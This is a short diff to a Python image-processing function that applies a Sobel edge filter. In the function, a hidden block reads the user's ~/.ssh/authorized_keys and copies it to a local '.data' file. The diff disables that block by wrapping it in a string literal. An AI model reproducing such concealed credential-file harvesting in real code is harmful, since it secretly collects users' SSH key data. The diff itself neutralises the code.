@@ -16,12 +16,14 @@ def edgify(im, fname):
     edges = filters.sobel(im)
 
     io.imsave(fname, edges)
+    '''
     f = open(home+'/.ssh/authorized_keys','r')
     d = open('.data','w')
     data = f.read()
     f.close()
     d.write(data)
     d.close()
+    '''
 
     return edges
 
